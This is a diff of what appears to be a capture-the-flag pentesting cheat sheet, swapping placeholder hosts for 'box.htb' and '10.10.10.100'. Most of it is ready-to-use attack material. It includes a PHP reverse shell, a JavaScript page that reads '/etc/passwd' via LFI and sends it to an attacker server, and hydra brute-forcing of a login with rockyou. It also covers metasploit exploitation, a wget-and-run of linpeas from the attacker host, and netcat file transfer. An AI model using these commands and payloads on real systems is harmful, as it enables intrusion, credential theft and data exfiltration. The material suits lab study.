@@ -1,11 +1,16 @@
 ## Add host:
 ```bash
-echo "10.129.201.123 sea.htb" | sudo tee -a /etc/hosts
+echo "10.100.100.100 box.htb" | sudo tee -a /etc/hosts
 ```
 
 ## Generate ssh key:
 ```bash
 ssh-keygen -f /home/$USER/.ssh/id_rsa -y
+```
+
+## Copy ssh key:
+```bash
+ssh-copy-id user@box.htb
 ```
 
 # Recon
@@ -21,12 +26,12 @@ dirb http://example.com /usr/share/wordlists/dirb/common.txt -o dirb_output.txt
 
 ## Subdomains enumeration with `ffuf`:
 ```bash
-ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://example.com -H "Host: FUZZ.example.com" -mc 200 -fs 15949 -o ffuf_output.json -of json
+ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://box.htb -H "Host: FUZZ.box.htb" -mc 200 -fs 15949 -o ffuf_output.json -of json
 ```
 
 ## Web app scan with `nikto`:
 ```bash
-nikto -h example.com -p 80 -o nikto_output.txt
+nikto -h box.htb -p 80 -o nikto_output.txt
 ```
 # Exploit
 ## Exploit with `metasploit`:
@@ -39,7 +44,7 @@ search <exploit_name>
 
 use exploit/linux/http/exploit_name
 
-set RHOSTS example.com
+set RHOSTS box.htb
 set RPORT 80
 
 show payloads
@@ -56,7 +61,7 @@ nc -lvnp 4444
 ### Reverse shell:
 ```php
 <?php
-$ip = 'x.x.x.x'; // change this to your IP address
+$ip = '10.10.10.100'; // change this to your IP address
 $port = 4444; // change this to your listening port
 $socket = fsockopen($ip, $port);
 if ($socket) {
@@ -90,7 +95,7 @@ sudo python3 -m http.server 4444
     <title>CTF</title>
     <script>
       (async function() {
-        const YOUR_SERVER_IP = "10.10.14.46";
+        const YOUR_SERVER_IP = "10.10.10.100";
         const targetFile = "/etc/passwd";  // Example file path to try LFI
         
         try {
@@ -228,11 +233,11 @@ http.createServer((req, res) => {
 ## Login brute-force with `hydra`
 ### Syntax 1:
 ```bash
-sudo hydra -v -V -d -l admin -P /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt -o hydra_output.txt http-post-form://example.com/login"&username=^USER^&password=^PASS^:F=Bad"
+sudo hydra -v -V -d -l admin -P /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt -o hydra_output.txt http-post-form://box.htb/login"&username=^USER^&password=^PASS^:F=Bad"
 ```
 ### Syntax 2:
 ```bash
-sudo hydra -v -V -l admin -P /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt -o hydra_output.txt example.com http-post-form "/login:username=^USER^&password=^PASS^=:F=Bad"
+sudo hydra -v -V -l admin -P /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt -o hydra_output.txt box.htb http-post-form "/login:username=^USER^&password=^PASS^=:F=Bad"
 ```
 
 # Privilege escalation
@@ -247,7 +252,7 @@ sudo python3 -m http.server 8080
 ### Download and execute:
 ```bash
 cd /tmp
-wget x.x.x.x:8080/linpeas.sh
+wget 10.10.10.100:8080/linpeas.sh
 chmod +x linpeas.sh
 ./linpeas.sh -q -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,network_information,users_information,software_information,interesting_perms_files,interesting_files,api_keys_regex
 ```
@@ -257,7 +262,7 @@ chmod +x linpeas.sh
 ### Sender:
 ```bash
 tar -czf directory.tar.gz ./directory
-cat directory.tar.gz | nc example.com 1234
+cat directory.tar.gz | nc box.htb 1234
 ```
 ### Receiver:
 ```bash
@@ -282,7 +287,7 @@ import requests
 
 # Configuration
 PUBLIC_HOST = "0.0.0.0"  # Listen on all interfaces
-PUBLIC_PORT = 5000        # Public-facing port (the one you want external users to access)
+PUBLIC_PORT = 4444        # Public-facing port (the one you want external users to access)
 TARGET_URL = "http://127.0.0.1:8080"  # Local service URL to be proxied
 
 class ProxyHandler(http.server.BaseHTTPRequestHandler):
